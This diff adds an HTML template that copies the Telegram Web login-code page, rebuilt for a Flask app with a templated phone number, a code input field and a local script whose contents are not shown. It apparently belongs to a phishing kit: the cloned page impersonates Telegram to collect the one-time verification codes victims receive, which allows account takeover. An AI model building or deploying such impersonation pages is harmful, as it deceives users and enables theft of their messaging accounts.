@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en" class="no-touch night" style="--vh:8.9px; --message-highlightning-color:hsla(299.143, 44.1667%, 37.4706%, 0.4);">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Telegram Web</title>
+	<meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+	<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+	<meta name="mobile-web-app-capable" content="yes">
+	<meta name="mobile-web-app-title" content="Telegram Web">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-title" content="Telegram Web">
+	<meta name="application-name" content="Telegram Web">
+	<meta name="msapplication-TileColor" content="#2d89ef">
+	<meta name="msapplication-TileImage" content="assets/img/mstile-144x144.png?v=jw3mK7G9Ry">
+	<meta name="msapplication-config" content="browserconfig.xml?v=jw3mK7G9Ry">
+	<meta name="theme-color" content="#212121">
+	<meta name="color-scheme" content="dark">
+	<meta name="google" content="notranslate">
+	<meta name="robots" content="noindex">
+	<meta property="og:type" content="website">
+	<meta property="og:url" content="https://web.telegram.org/k/">
+	<meta property="og:title" content="Telegram Web">
+	<meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+	<meta property="og:image" content="assets/img/android-chrome-192x192.png?v=jw3mK7G9Ry">
+	<meta property="twitter:card" content="summary_large_image">
+	<meta property="twitter:url" content="https://web.telegram.org/k/">
+	<meta property="twitter:title" content="Telegram Web">
+	<meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+	<meta property="twitter:image" content="assets/img/android-chrome-192x192.png?v=jw3mK7G9Ry">
+	<link rel="apple-touch-icon" sizes="180x180" href="https://web.telegram.org/k/assets/img/apple-touch-icon.png?v=jw3mK7G9Ry">
+	<link rel="icon" type="image/png" sizes="16x16" href="https://web.telegram.org/k/assets/img/favicon-16x16.png?v=jw3mK7G9Ry">
+	<link rel="icon" type="image/png" sizes="32x32" href="https://web.telegram.org/k/assets/img/favicon-32x32.png?v=jw3mK7G9Ry">
+	<link rel="icon" type="image/png" sizes="192x192" href="https://web.telegram.org/k/assets/img/android-chrome-192x192.png?v=jw3mK7G9Ry">
+	<link rel="alternate icon" href="https://web.telegram.org/k/assets/img/favicon.ico?v=jw3mK7G9Ry" type="image/x-icon">
+	<link rel="mask-icon" href="https://web.telegram.org/k/assets/img/safari-pinned-tab.svg?v=jw3mK7G9Ry" color="#3390ec">
+	<link rel="stylesheet" type="text/css" href="{{ url_for('static',filename='style1.css') }}">
+  	<link rel="stylesheet" type="text/css" href="{{ url_for('static',filename='style2.css') }}" media="only screen and (min-width:721px)">
+</head>
+
+<body class="animation-level-2 is-left-column-shown">
+	<!--[if IE]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+	<div class="whole" id="auth-pages" style="">
+		<div class="scrollable scrollable-y no-scrollbar" style="">
+			<div class="auth-placeholder"></div>
+			<div class="tabs-container auth-pages__container" data-animation="tabs">
+				<div class="tabs-tab page-signImport">
+					<div class="container center-align"></div>
+				</div>
+				<div class="tabs-tab page-authCode active" style="">
+					<div class="container center-align">
+						<div class="auth-image">
+							<div class="media-sticker-wrapper"><img class="rlottie" src="{{ url_for('static',filename='anim.gif') }}"></div>
+						</div>
+						<div class="phone-wrapper">
+							<h4 class="phone">{{phone}}</h4><img class="phone-edit tgico-edit" src="{{ url_for('static',filename='edit.png') }}"></div>
+						<p class="subtitle sent-type"><span class="i18n">We have sent you a message in Telegram<br>with the code.</span></p>
+						<div class="input-wrapper">
+							<div class="input-field">
+								<input type="tel" name="129504992215371641" autocomplete="off" required="" class="input-field-input" dir="auto">
+								<div class="input-field-border"></div>
+								<label><span class="i18n">Code</span></label>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="tabs-tab page-password"></div>
+				<div class="tabs-tab page-signUp"></div>
+			</div>
+			<div class="auth-placeholder"></div>
+		</div>
+	</div>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+  	<script src="{{ url_for('static',filename='script_code.js') }}"></script>
+</body>
+
+</html>
